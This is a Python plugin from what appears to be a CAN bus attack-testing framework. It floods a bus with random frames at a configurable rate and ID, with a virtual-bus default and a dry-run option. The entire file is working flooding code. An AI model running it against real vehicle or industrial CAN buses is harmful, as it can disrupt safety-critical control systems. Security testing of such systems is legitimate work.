# attacks/plugins/flooding_plugin.py
import time
from typing import Dict, Any
from attacks.plugin_base import AttackPlugin
from utils.can_bus import make_bus
import can
import random

class FloodingPlugin(AttackPlugin):
    """
    High-rate flooding attack: sends frames rapidly to overload bus.
    config:
      bustype, channel, id (default 0x100), rate (msgs/sec), duration
    """
    def _run(self):
        cfg = self.config
        bustype = cfg.get("bustype", "virtual")
        channel = cfg.get("channel", None)
        can_id = int(cfg.get("id", 0x100))
        rate = float(cfg.get("rate", 100.0))  # messages/sec
        interval = 1.0 / max(rate, 1.0)
        duration = cfg.get("duration", None)

        if self.dry_run:
            print(f"[FloodingPlugin] DRY RUN: would flood id=0x{can_id:x} at {rate} msg/s")
            start = time.time()
            while not self._stop_event.is_set():
                print("Flood")
                time.sleep(interval)
                if duration and (time.time() - start) >= duration:
                    break
            return

        bus = make_bus(channel=channel, bustype=bustype)
        start = time.time()
        print(f"[FloodingPlugin] starting flood id=0x{can_id:x} rate={rate}")
        while not self._stop_event.is_set():
            data = bytes([random.randint(0,255)])
            msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
            try:
                bus.send(msg)
            except Exception as e:
                print(f"[FloodingPlugin] send error: {e}")
            time.sleep(interval)
            if duration and (time.time() - start) >= duration:
                break
        print("[FloodingPlugin] finished")
